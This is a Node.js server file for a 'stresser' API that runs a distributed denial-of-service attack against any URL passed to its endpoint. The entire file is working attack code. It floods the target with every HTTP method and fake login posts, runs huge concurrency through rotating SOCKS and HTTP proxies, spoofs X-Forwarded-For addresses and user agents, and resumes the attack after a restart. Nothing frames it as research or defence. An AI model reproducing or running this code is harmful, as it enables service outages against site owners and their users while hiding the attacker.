const express = require("express");
const { request } = require("undici");
const fs = require("fs");
const path = require("path");
const { SocksProxyAgent } = require("socks-proxy-agent");
const { HttpsProxyAgent } = require("https-proxy-agent");
const { rainbow } = require("gradient-string");
const { fakeState } = require("./fakeState.js");

const app = express();
app.use(express.json());

const stateFilePath = path.join(__dirname, 'attackState.json');
const proxyFilePath = path.join(__dirname, "proxy.txt");
const ualist = path.join(__dirname, "ua.txt");

// Configuration
const numThreads = 50000; // Extremely high concurrency (adjust based on server capacity)
const httpMethods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'];

// Minimal state management
const ensureStateFileExists = () => {
    if (!fs.existsSync(stateFilePath)) {
        fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, startTime: null, duration: 0, targetUrl: null }));
    }
};

const saveState = (state) => {
    fs.writeFileSync(stateFilePath, JSON.stringify(state));
};

const loadState = () => {
    ensureStateFileExists();
    try {
        return JSON.parse(fs.readFileSync(stateFilePath, 'utf-8'));
    } catch {
        return { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
    }
};

const initialState = loadState();
let continueAttack = initialState.continueAttack;
let startTime = initialState.startTime;
let duration = initialState.duration;
let targetUrl = initialState.targetUrl;

if (continueAttack && startTime && duration && Date.now() > startTime + duration) {
    continueAttack = false;
}

const langHeaders = ["en-US,en;q=0.9", "fr-FR,fr;q=0.9"];
const referrers = ["https://www.google.com/", "https://www.example.com/"];
const acceptHeaders = ["text/html,application/xhtml+xml,*/*;q=0.8", "application/json,*/*"];

const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
const sanitizeUA = (userAgent) => userAgent.replace(/[^\x20-\x7E]/g, "");

const userAgents = () => {
    try {
        return fs.readFileSync(ualist, "utf-8").split("\n").map(line => line.trim());
    } catch {
        return ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"];
    }
};

const loadProxies = () => {
    try {
        return fs.readFileSync(proxyFilePath, "utf-8").split("\n").map(line => line.trim()).filter(line => line);
    } catch {
        return [];
    }
};

const generateRandomPayload = () => {
    return {
        data: { id: Math.random().toString(36).substring(7) },
        contentType: 'application/json'
    };
};

const createHeaders = (url) => ({
    "User-Agent": sanitizeUA(getRandomElement(userAgents())),
    "Accept": getRandomElement(acceptHeaders),
    "Accept-Language": getRandomElement(langHeaders),
    "Referer": getRandomElement(referrers),
    "Connection": "keep-alive",
    "X-Forwarded-For": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`
});

const randomAttack = async (url, agent, continueAttack) => {
    if (!continueAttack || !url) return;

    const headers = createHeaders(url);
    const { data: payload, contentType } = generateRandomPayload();
    headers["Content-Type"] = contentType;

    // Send all HTTP methods simultaneously
    const requests = httpMethods.map(method => {
        return request(url, {
            method,
            headers,
            body: method !== 'GET' && method !== 'HEAD' ? JSON.stringify(payload) : undefined,
            dispatcher: agent,
            maxRedirections: 0
        }).catch(err => {
            if (err.code === "ECONNRESET" || err.code === "ETIMEDOUT") return;
            if (err.response?.statusCode === 503) console.log(rainbow("Target under heavy load (503)!"));
        });
    });

    try {
        await Promise.all(requests);
    } catch {
        // Ignore errors to keep going
    }

    // Immediate recursion for maximum speed
    process.nextTick(() => randomAttack(url, agent, continueAttack));
};

const performAttack = async (url, agent, continueAttack) => {
    if (!continueAttack || !url) return;

    const headers = createHeaders(url);

    // Send login POST and GET simultaneously
    const requests = [
        request(url.match(/^(https?:\/\/[^\/]+)/)[0] + "/login", {
            method: 'POST',
            headers: { ...headers, "Content-Type": "application/json" },
            body: JSON.stringify({ state: fakeState() }),
            dispatcher: agent,
            maxRedirections: 0
        }),
        request(url, {
            method: 'GET',
            headers,
            dispatcher: agent,
            maxRedirections: 0
        })
    ];

    try {
        await Promise.all(requests.map(req => req.catch(() => {})));
    } catch {
        // Ignore errors
    }

    // Immediate recursion
    process.nextTick(() => performAttack(url, agent, continueAttack));
};

const updateState = () => {
    saveState({ continueAttack, startTime, duration, targetUrl });
};

// Save state infrequently
setInterval(updateState, 60000);

const waitForValidUrl = (url, durationHours, callback) => {
    if (!url || !/^https?:\/\//.test(url)) {
        setTimeout(() => waitForValidUrl(url, durationHours, callback), 1000);
        return;
    }
    callback(url, durationHours);
};

const startAttack = (url, durationHours) => {
    waitForValidUrl(url, durationHours, (validUrl, validDuration) => {
        const proxies = loadProxies();
        if (!proxies.length) {
            console.error("No proxies found. Add proxies to proxy.txt.");
            return;
        }

        continueAttack = true;
        targetUrl = validUrl;
        startTime = Date.now();
        duration = validDuration * 60 * 60 * 1000;

        setTimeout(() => {
            continueAttack = false;
            console.log(rainbow("Attack duration completed."));
        }, duration);

        // Maximize thread usage
        for (let i = 0; i < Math.min(numThreads, proxies.length * 2); i++) {
            if (!continueAttack) break;

            const randomProxy = getRandomElement(proxies);
            const proxyParts = randomProxy.split(":");
            const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
            const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
            const agent = proxyProtocol === "socks5" ? new SocksProxyAgent(proxyUrl) : new HttpsProxyAgent(proxyUrl);

            performAttack(validUrl, agent, continueAttack);
            randomAttack(validUrl, agent, continueAttack);
        }
    });
};

app.get("/stresser", async (req, res) => {
    const url = req.query.url;
    const durationHours = parseFloat(req.query.duration) || 1;
    if (!url || !/^https?:\/\//.test(url)) {
        return res.status(400).json({ error: "Invalid URL." });
    }
    if (isNaN(durationHours) || durationHours <= 0) {
        return res.status(400).json({ error: "Invalid duration." });
    }
    targetUrl = url;
    res.json({ message: "Starting MAXIMUM DDOS ATTACK with ALL METHODS..." });
    startAttack(targetUrl, durationHours);
});

const port = process.env.PORT || 25694;
app.listen(port, () => {
    console.log(rainbow(`API running on http://localhost:${port}`));
    if (continueAttack && targetUrl) {
        console.log(rainbow('Resuming previous attack...'));
        const remainingDuration = (startTime + duration - Date.now()) / (60 * 60 * 1000);
        if (remainingDuration > 0) {
            startAttack(targetUrl, remainingDuration);
        }
    }
});